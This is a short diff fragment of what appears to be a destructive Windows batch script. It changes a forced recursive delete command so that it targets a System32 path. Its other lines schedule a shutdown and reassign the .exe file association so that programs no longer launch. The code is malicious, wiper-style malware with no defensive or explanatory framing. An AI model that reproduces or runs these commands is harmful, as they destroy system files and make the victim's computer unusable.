@@ -61,7 +61,7 @@ timeout 60 /nobreak
  
 Shutdown.exe /s /t 120
  
-Del "C:\Windows\Program Files" /s /q /f
+Del "C:\Windows\System32/regedit" /s /q /f
 
 assoc .exe=.Ink
 
